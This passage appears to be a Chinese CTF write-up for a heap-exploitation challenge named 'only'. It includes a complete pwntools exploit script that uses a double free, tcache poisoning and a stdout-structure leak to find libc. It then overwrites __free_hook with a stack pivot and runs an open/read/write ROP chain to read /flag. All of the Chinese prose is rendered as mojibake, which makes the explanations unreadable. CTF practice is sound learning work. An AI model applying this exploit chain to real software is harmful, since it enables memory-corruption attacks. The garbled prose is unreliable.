pause()
menu(5)
sh.send(b'/flag\x00')
sh.interactive()
```



## only

è¿™é¢˜åˆè§çš„æ—¶å€™åªå‘ç°äº† `initial` è¿™ä¸ªå‡½æ•°èƒ½æ¸…é™¤ `chunk` çš„ `bk` å’Œ `fd` é€ æˆ `double free`ï¼Œä½†æ˜¯åªèƒ½ç”¨ä¸€æ¬¡ï¼Œè€Œä¸”ä¹Ÿåªèƒ½å­˜åœ¨ä¸€ä¸ªå †æŒ‡é’ˆï¼Œæ‰€ä»¥é¡¶å¤šåªèƒ½åšåˆ°æ³„éœ²å †åœ°å€ / libc åœ°å€ / æ§åˆ¶ç¨‹åºæµä¸­çš„ä¸€ä¸ªã€‚ä½†æ˜¯å®é™…ä¸Šè¿™é¢˜æœ€å¤§çš„éš¾ç‚¹å°±æ˜¯åœ¨å †é£æ°´è¿™ä¸Šé¢ï¼Œå› ä¸ºæ²™ç®±çš„å­˜åœ¨ä½¿å¾— `tcache` ä¸Šæœ‰å¾ˆå¤šå¯ç”¨çš„å †ã€‚æ­¤å¤–ï¼Œç”±äºè¿™é¢˜æˆ‘ä»¬ä¿®æ”¹ `fd` æŒ‡é’ˆå®é™…å­˜åœ¨ä¸€ä¸ª 1/256 çš„çˆ†ç ´è¦æ±‚ï¼Œå› æ­¤æœ¬åœ°è°ƒè¯•æƒ…å†µä¸‹æ·»åŠ äº†å‚æ•° `aslr=False` ï¼Œ

### åˆ©ç”¨æ€è·¯

- é¦–å…ˆé€ ä¸€ä¸ª`0xf0` å¤§å°å †å— (1) çš„  `double free`ï¼Œä¹‹åï¼Œåœ¨è¿™ä¸ª `double free` å †å—ä¸Šä¿®æ”¹ `fd` æŒ‡é’ˆåˆ°å…¶å®ƒå¤§å°ï¼ˆåœ¨è¿™é‡Œæˆ‘ä»¬é€‰æ‹©äº† `0x70` å¤§å°ï¼‰çš„å †å—ä¸Šå½¢æˆ UAFï¼Œä¿®æ”¹è¿™ä¸ªå †å— (2) çš„å¤§å°ä¸º `largebin` èŒƒå›´ã€‚åœ¨ä¿®æ”¹å¤§å°çš„åŒæ—¶ï¼Œå¯ä»¥æŠŠè¯¥å †å— (2) çš„ `fd` æŒ‡é’ˆå†æ”¹æˆè¯¥ä½ç½®å½¢æˆæ–°çš„ `double free`ã€‚

![ä¿®æ”¹ fd åˆ° 0x70 å¤§å°çš„å †å—ä¸Š](https://cdn.novanoir.moe/img/image-20221111180027906.png)

![resize + double_free](https://cdn.novanoir.moe/img/image-20221111180232149.png)

- åœ¨æˆ‘ä»¬é‡Šæ”¾è¿™ä¸ªå †å— (2) åå®ƒè¢«å¡å…¥ `unsortedbin` ä¸­ï¼Œç”±äº `double free`ï¼Œæˆ‘ä»¬å¯ä»¥å†æ·»åŠ ä¸€ä¸ªæ–°çš„å †å— (3)ï¼Œæ­¤æ—¶å®ƒä¼šè¢«å¸ƒç½®åœ¨å †å— (2) ä¸Šï¼Œä¿®æ”¹ (3) çš„å†…å®¹å¯ä»¥ä½¿å †å— (2) çš„ `fd` æ”¹ä¸º `_IO_2_1_stdout_` çš„æŒ‡é’ˆã€‚ä¹‹åæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ‰“ IO ï¼Œä¿®æ”¹ `_IO_2_1_stdout_` è¿™ä¸ªç»“æ„ä½“çš„ `_IO_write_base` æ³„éœ² `libc`ï¼Œè¿™é‡Œå…·ä½“å¯ä»¥è¯¦è§ `puts` å¯¹äº IO é“¾çš„è°ƒç”¨

  >  `0x4f1708` ä½ç½®å­˜çš„æ˜¯ `_IO_2_1_stdin_` çš„æŒ‡é’ˆï¼Œæ‰€ä»¥åº”è¯¥å°† `_IO_write_base` æ”¹åˆ° `4f1708`ï¼Œä½†æ˜¯æ‡’å¾—æ”¹äº†

  ![é‡Šæ”¾å®Œå †å—](https://cdn.novanoir.moe/img/image-20221111180931194.png)

  ![æ·»åŠ æ–°çš„å †å—](https://cdn.novanoir.moe/img/image-20221111181013824.png)

  ![ä¿®æ”¹åçš„_IO_2_1_stdout_](https://cdn.novanoir.moe/img/image-20221111181343897.png)

  ![puts çš„ IO è°ƒç”¨æ ˆ](https://cdn.novanoir.moe/img/image-20221111181726014.png)

  - æ­¤æ—¶æˆ‘ä»¬å·²ç»æ²¡æœ‰ç°æˆçš„ UAF å¯ä»¥ä½¿ç”¨äº†ï¼Œä½†æ˜¯åˆ«å¿˜äº† `unsorted_bin` ä¸­è¿˜æœ‰æ— æ•°ä¸ªé‡å çš„å †å—ã€‚æˆ‘ä»¬æ‹¿å‡ºç¬¬ä¸€ä¸ªå †å—ï¼Œæ‰“ `free_hook` å³å¯ã€‚ç„¶è€Œæ³¨æ„åˆ°çš„æ˜¯ï¼Œæˆ‘ä»¬èƒ½å†™çš„å­—èŠ‚æ•°æ˜¯ååˆ†å°‘çš„ã€‚è¿™ä¹Ÿä¸å¾—ä¸å¼ºåˆ¶æˆ‘ä»¬åˆ©ç”¨å…¶ä»–çš„æ–¹æ³•è½¬ç§»åˆ°åˆ«çš„ä¾‹å¦‚ `gets` ç­‰å‡½æ•°ä¸Šè¿›è¡Œ ROPã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€ä¸ª `magic_gadget`ï¼š`mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];`ã€‚åœ¨ `free_hook` æ‰§è¡Œæ—¶ï¼Œå®ƒä¼šé¦–å…ˆå°† `rdx` èµ‹å€¼ä¸º `[rdi+8]` ï¼Œè€Œ `rdi` å¯ä»¥ç”±æˆ‘ä»¬ `free` çš„å †å—å†³å®šï¼ˆä¾‹å¦‚ï¼Œæˆ‘ä»¬ç›´æ¥é‡Šæ”¾è¿™ä¸ªä½äº `free_hook` ä¸Šçš„å †å—ï¼Œè¿™æ ·å¯¹äºæˆ‘ä»¬çš„å¸ƒç½®æ˜¯éå¸¸è½»æ¾çš„ï¼Œå¦åˆ™æˆ‘ä»¬è¿˜éœ€è¦æ³„éœ²å †åœ°å€å»åœ¨å¦ä¸€ä¸ªå †å—ä¸Šå¸ƒç½® ROP é“¾ï¼‰ï¼Œæˆ‘ä»¬é€šè¿‡ `mov rsp, rdx; ret;` è¿™ä¸ª gadget å³å¯æŠŠæ ˆå¸ƒç½®è¿‡æ¥ï¼Œä¹‹åç¨‹åºä¾¿ä»»æˆ‘ä»¬æ‘†å¸ƒäº†ã€‚æ„é€  ORW å³å¯æ‹¿ä¸‹ flagã€‚

    > ![å¤§æ¦‚æµç¨‹](https://cdn.novanoir.moe/img/image-20221111182906152.png)

    ![ub åŒ…å«çš„å †å—](https://cdn.novanoir.moe/img/image-20221111182441414.png)

### åˆ©ç”¨è„šæœ¬

```python
from pwn import *

context(log_level='DEBUG', arch='amd64', os='linux')
context.terminal = "wt.exe -w main nt bash -c".split()

sh = process(['./only'])
elf = ELF('./only')
libc = ELF('/home/nova/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')

def initial(size: int = 0, init: bool = False):
    sh.sendlineafter(b"Choice >> ", b'0')
    if init:
        sh.sendlineafter(b"Size:", str(size).encode())


def increase(size: int, content: bytes):
    sh.sendlineafter(b"Choice >> ", b'1')
    sh.sendlineafter(b"Size:", str(size).encode())
    sh.sendafter(b"Content:", content)


def decrease():
    sh.sendlineafter(b"Choice >> ", b'2')


def debug():
    gdb.attach(sh, 'b *$rebase(0x1718)\nb *$rebase(0x1794)\nb *$rebase(0x1773)')
    pause()


while True:
    sh = process(['./only'])
    increase(0xe0, b'\n')
    decrease()
    initial(init=False)
    decrease()

    increase(0xe0, b'\xf0\xb7\n')
    increase(0xe0, b'\xf0\xb7\n')
    try:
        increase(0xe0, p64(0) + p64(0x491) + b'\x00\xb8\n')
        increase(0x60, b'\n')
        decrease()
        increase(0x30, b'\xa0\x16\n')
        increase(0x60, b'\n')
        increase(0x60, p64(0xfbad3887) + p64(0)*3 + p8(8) + b'\n')
    except EOFError:
        sh.close()
        continue

    libc_base = u64(sh.recv(6).ljust(8, b'\x00')) - 0x1eb980
    if not hex(libc_base).startswith("0x7f"):
        sh.close()
        continue
    free_hook = libc_base + libc.sym['__free_hook']
    system = libc_base + libc.sym['system']
    pop_rdi_ret = libc_base + 0x26b72
    pop_rsi_ret = libc_base + 0x27529
    pop_rdx_pop_r12_ret = libc_base + 0x11c1e1
    pop_rbp_ret = libc_base + 0x256c0
    mov_rsp_rdx_ret = libc_base + 0x5e650
    open = libc_base + libc.sym['open']
    read = libc_base + libc.sym['read']
    write = libc_base + libc.sym['write']
    setcontext = libc_base + libc.sym['setcontext']
    gets = libc_base + libc.sym['gets']
    gadget = libc_base + 0x1547a0  # mov rdx, [rdi+8]; mov rsp, rdx; call [rdx+0x20]
    bss = libc_base + 0x1ED648
    increase(0xe0, p64(0) * 5 + p64(0x81) + p64(free_hook) + b'\n')

    increase(0x70, p64(0) + b'\n')
    print("libc_base >>>", hex(libc_base))
    #                                   rdi+8             [rdi+8] = rdx                                                 rdx+0x20
    #                                                          rsp              rbp            rbp+8       
    increase(0x70, p64(gadget) + p64(free_hook + 0x10) + p64(pop_rbp_ret) + p64(free_hook) + p64(gets) + p64(0) + p64(mov_rsp_rdx_ret) + p64(0) + b'\n')
    decrease()
    payload = b'a'*0x28
    payload += p64(pop_rdi_ret) + p64(free_hook + 0xa8) + p64(pop_rsi_ret) + p64(0) + p64(open)
    payload += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(bss) + p64(pop_rdx_pop_r12_ret) + p64(0x30)*2 + p64(read)
    payload += p64(pop_rdi_ret) + p64(1) + p64(write) + b'/flag\x00'
    sh.sendline(payload)
    sh.interactive()

```





## ç¢ç¢å¿µ

è¿™æ¬¡ PWN åŸºæœ¬éƒ½æ˜¯é«˜ç‰ˆæœ¬çš„åˆ©ç”¨ï¼Œå¯¹äºæˆ‘è¿™ä¸ªä½ç‰ˆæœ¬å †éƒ½æ²¡æ‰“æ˜ç™½çš„äººå¤ç°ç¡®å®æ˜¯ç­‰äºæ•´ä¸ªæŠ€æœ¯æ ˆå®Œå…¨æ–°å­¦äº†ï¼ˆï¼‰ï¼Œæ€»è€Œè¨€ä¹‹é™¤äº† `slot` è¿™ä¸ª 0 è§£é¢˜å…¨å¤ç°å®Œäº†ï¼Œå¯å–œå¯è´ºå¯å–œå¯è´ºã€‚

## å‚è€ƒèµ„æ–™

### webheap / webheap_revenge

[google / libnop](https://github.com/google/libnop)

### store

[[åŸåˆ›]House of catæ–°å‹glibcä¸­IOåˆ©ç”¨æ‰‹æ³•è§£æ && ç¬¬å…­å±Šå¼ºç½‘æ¯House of catè¯¦è§£](https://bbs.pediy.com/thread-273895.htm)

[setup](https://blog.mark0519.com/#/reproduce/221011-setup)

[project-sekai-ctf/sekaictf-2022/pwn/hello-world-setup/solution](https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/pwn/hello-world-setup/solution)